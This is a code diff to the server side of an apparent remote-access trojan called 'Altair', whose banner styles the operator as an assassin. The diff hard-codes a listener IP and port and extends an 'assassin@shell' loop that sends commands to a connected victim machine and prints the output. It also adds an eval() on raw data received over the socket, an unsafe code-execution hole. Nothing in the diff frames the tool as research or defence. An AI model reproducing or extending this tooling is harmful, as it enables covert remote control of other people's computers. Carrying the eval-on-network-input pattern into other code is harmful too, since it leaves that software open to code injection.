@@ -1,4 +1,5 @@
 from getpass import getuser
+from http import client
 from time import sleep
 from util import versionControl,Console,AltairCommandList
 import os
@@ -24,7 +25,7 @@ c$$$cc$$$c  '''    $  '''    $c$$$cc$$$c  '''    $  '''    $$$$  $$$ "Y$c$$
 \t\tgithub: https://github.com/Arif-Helmsys
 \t\t     Assassin Name: Altair
 """
-ip = ""
+ip = "192.168.1.5"
 port = 1881
 state = False
 print(f"{random.choice(Console.SHAKER)}{banner}")
@@ -101,18 +102,21 @@ class Server(socket.socket):
                 client_socket.send(AltairCommandList.INCLUDE_SHELL.encode())
                 while True:
                     c = Console._input_(self,f"{Console.CYAN}\t    ├──({Console.BOLD}{Console.PURPLE}assassin@shell{Console.CYAN}){Console.DEFAULT}{Console.CYAN}\n\t   ╰──────{Console.RED}{Console.BOLD}# ".expandtabs(4))
-                    if c == "":
+                    if c == "help":
+                        print(AltairCommandList.HELPER_C)
+                    elif c == "":
                         print(f"{Console.CYAN}\t      ╰──/{Console.YELLOW}Please No Epmty")
                     else:
                         client_socket.send(c.encode())
-                        resp = client_socket.recv(18432).decode()
-                        buffer = super().getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)
-                        if buffer > 4096:
-                            buffer += 1024
-                            super().setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF,buffer)
-                        if resp == "exited":
+                        resp = eval(client_socket.recv(4096).decode())
+                        byte = ""
+                        for i,j in resp.items():
+                            byte += i
+                        resp_ = client_socket.recv(1024 if int(byte)<1024 else int(byte)).decode()
+                        if resp_ == "exited":
                             break
-                        print(f"{resp}")
+                        else:
+                            print("\n".join(f"\t\t{Console.CYAN}╰──/{Console.DEFAULT}{x}".expandtabs(7) for x in resp_.split("\n")))
 
             elif _input == AltairCommandList.SS:
                 client_socket.send(AltairCommandList.SS.encode())
